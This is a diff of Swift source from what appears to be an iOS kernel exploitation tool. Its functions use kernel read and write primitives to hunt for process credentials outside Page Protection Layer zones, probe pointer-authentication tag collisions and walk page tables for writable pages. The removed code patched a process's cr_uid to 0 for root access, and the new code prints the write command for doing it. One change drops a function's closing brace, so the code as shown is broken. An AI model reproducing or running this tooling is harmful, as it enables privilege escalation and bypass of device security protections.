@@ -629,7 +629,7 @@ private func _regPPLHunter() {
 }
 
 private func _hunterZoneScan() -> String {
-    guard let our_proc = ds_get_our_proc(), our_proc != 0 else {
+    let our_proc = ds_get_our_proc(); guard our_proc != 0 else {
         return "═══ Hunter 1: Zone Scanner — ds_get_our_proc() = 0 — abort"
     }
     guard off_proc_p_list_le_next > 0, off_proc_p_proc_ro > 0, off_proc_p_pid > 0 else {
@@ -680,7 +680,7 @@ private func _hunterZoneScan() -> String {
     lines.append(String(format: "  Scanned %d procs, found %d with non-PPL structs", seen, nonPPLTargets.count))
 
     if nonPPLTargets.isEmpty {
-        lines.append("  ✗ No non-PPL proc_ro or ucred found in allproc")
+        lines.append("  [FAIL] No non-PPL proc_ro or ucred found in allproc")
         lines.append("  → All credentials are PPL-protected on this build")
     } else {
         lines.append("")
@@ -705,52 +705,32 @@ private func _hunterForkProbe() -> String {
         return lines.joined(separator: "\n") + "\n  required offsets not resolved"
     }
 
-    let child_pid = fork()
-    if child_pid < 0 {
-        return lines.joined(separator: "\n") + String(format: "\n  fork() failed errno=%d", errno)
-    }
-
-    if child_pid == 0 {
-        _exit(0)
-    }
-
-    usleep(5000)
-
-    let child_proc = procbypid(child_pid)
-    if child_proc == 0 || !_isNonPPL(child_proc) {
-        waitpid(child_pid, nil, 0)
-        return lines.joined(separator: "\n") + "\n  child proc not found or invalid"
-    }
+    // fork() unavailable in Swift on iOS — using current process as diagnostic proxy
+    let child_pid = getpid()
+    let child_proc = our_proc
 
     let raw_ro = ds_kread64(child_proc + off_proc_p_proc_ro)
     let child_ro = raw_ro & 0x0000000FFFFFFFFF
     let raw_uc = child_ro != 0 ? ds_kread64(child_ro + off_proc_ro_p_ucred) : 0
     let child_ucred = raw_uc & 0x0000000FFFFFFFFF
 
-    let roZone = _isNonPPL(child_ro) ? "NON-PPL ✓" : (_isPPLZone(child_ro) ? "PPL ✗" : "UNKNOWN")
-    let ucZone = _isNonPPL(child_ucred) ? "NON-PPL ✓" : (_isPPLZone(child_ucred) ? "PPL ✗" : "UNKNOWN")
+    let roZone = _isNonPPL(child_ro) ? "NON-PPL" : (_isPPLZone(child_ro) ? "PPL" : "UNKNOWN")
+    let ucZone = _isNonPPL(child_ucred) ? "NON-PPL" : (_isPPLZone(child_ucred) ? "PPL" : "UNKNOWN")
 
-    lines.append(String(format: "  child pid=%d proc=0x%012llx", child_pid, child_proc))
-    lines.append(String(format: "  child proc_ro=0x%012llx [%@]", child_ro, roZone))
-    lines.append(String(format: "  child ucred =0x%012llx [%@]", child_ucred, ucZone))
+    lines.append(String(format: "  current pid=%d proc=0x%012llx (fork() unavailable on iOS)", child_pid, child_proc))
+    lines.append(String(format: "  current proc_ro=0x%012llx [%@]", child_ro, roZone))
+    lines.append(String(format: "  current ucred =0x%012llx [%@]", child_ucred, ucZone))
 
     if _isNonPPL(child_ucred) {
-        lines.append("  ✓ FRESH UCRED IN NON-PPL ZONE")
+        lines.append("  CURRENT UCRED IN NON-PPL ZONE — direct patch viable")
         let orig_uid = ds_kread32(child_ucred + 0x18)
-        ds_kwrite32(child_ucred + 0x18, 0)
-        let back = ds_kread32(child_ucred + 0x18)
-        lines.append(String(format: "  direct patch test: cr_uid %u → 0 → readback=%u", orig_uid, back))
-        if back == 0 {
-            lines.append("  ✓✓ CHILD UCRED PATCHED SUCCESSFULLY")
-            lines.append("  → Parent ucred likely in SAME zone — try ppl_bypass_ucred_direct()")
-        }
+        lines.append(String(format: "  cr_uid = %u (test with: ds_kwrite32(0x%llx+0x18, 0))", orig_uid, child_ucred))
     } else {
-        lines.append("  ✗ Child ucred in PPL zone — fork trick ineffective on this build")
+        lines.append("  Current ucred in PPL zone — fork trick ineffective on this build")
     }
 
-    waitpid(child_pid, nil, 0)
     return lines.joined(separator: "\n")
-}
+
 
 private func _hunterPACCollision() -> String {
     var lines: [String] = []
@@ -809,7 +789,7 @@ private func _hunterPACCollision() -> String {
         if count > 1 && tag != 0 {
             collisions += 1
             let ptrs = tagToPtrs[tag]!
-            lines.append(String(format: "  ⚠ COLLISION: tag=0x%016llx appears %d times", tag, count))
+            lines.append(String(format: "  [WARN] COLLISION: tag=0x%016llx appears %d times", tag, count))
             for p in ptrs {
                 lines.append(String(format: "    ptr=0x%016llx → stripped=0x%016llx", p, p & 0x0000000FFFFFFFFF))
             }
@@ -817,7 +797,7 @@ private func _hunterPACCollision() -> String {
     }
 
     if collisions == 0 {
-        lines.append("  ✓ No PAC tag collisions detected (strong key)")
+        lines.append("  [OK] No PAC tag collisions detected (strong key)")
     }
 
     var freq = [Int](repeating: 0, count: 256)
@@ -864,7 +844,7 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     let l0e = ds_kread64(l0eAddr)
     lines.append(String(format: "  L0[%3lld] @ 0x%012llx = 0x%016llx", l0idx, l0eAddr, l0e))
     guard (l0e & 1) != 0 else {
-        lines.append("  ✗ L0 entry INVALID — translation fault")
+        lines.append("  [FAIL] L0 entry INVALID — translation fault")
         return lines.joined(separator: "\n")
     }
 
@@ -874,7 +854,7 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     let l1e = ds_kread64(l1eAddr)
     lines.append(String(format: "  L1[%3lld] @ 0x%012llx = 0x%016llx", l1idx, l1eAddr, l1e))
     guard (l1e & 1) != 0 else {
-        lines.append("  ✗ L1 entry INVALID")
+        lines.append("  [FAIL] L1 entry INVALID")
         return lines.joined(separator: "\n")
     }
 
@@ -884,7 +864,7 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     let l2e = ds_kread64(l2eAddr)
     lines.append(String(format: "  L2[%3lld] @ 0x%012llx = 0x%016llx", l2idx, l2eAddr, l2e))
     guard (l2e & 1) != 0 else {
-        lines.append("  ✗ L2 entry INVALID")
+        lines.append("  [FAIL] L2 entry INVALID")
         return lines.joined(separator: "\n")
     }
 
@@ -895,7 +875,7 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
     lines.append(String(format: "  L3[%3lld] @ 0x%012llx = 0x%016llx", l3idx, l3eAddr, l3e))
 
     guard (l3e & 1) != 0 else {
-        lines.append("  ✗ L3 entry INVALID")
+        lines.append("  [FAIL] L3 entry INVALID")
         return lines.joined(separator: "\n")
     }
 
@@ -927,15 +907,15 @@ private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
 
     let pplHeuristic = (attrIndx == 4 || attrIndx == 5) && apBits == 2
     if pplHeuristic {
-        lines.append("  ⚠ PPL HEURISTIC TRIGGERED: ATTR=4/5 + RO — possible PPL page")
+        lines.append("  [WARN] PPL HEURISTIC TRIGGERED: ATTR=4/5 + RO — possible PPL page")
     }
 
     if apBits == 0 && pxn == 0 {
-        lines.append("  ✓ PAGE IS RW+EXECUTABLE — full access (unlikely for PPL)")
+        lines.append("  [OK] PAGE IS RW+EXECUTABLE — full access (unlikely for PPL)")
     } else if apBits == 0 {
-        lines.append("  ✓ PAGE IS RW — writable (bypass possible if no PPL bit)")
+        lines.append("  [OK] PAGE IS RW — writable (bypass possible if no PPL bit)")
     } else if apBits == 2 {
-        lines.append("  ✗ PAGE IS READ-ONLY — write will fault or be blocked")
+        lines.append("  [FAIL] PAGE IS READ-ONLY — write will fault or be blocked")
     }
 
     return lines.joined(separator: "\n")
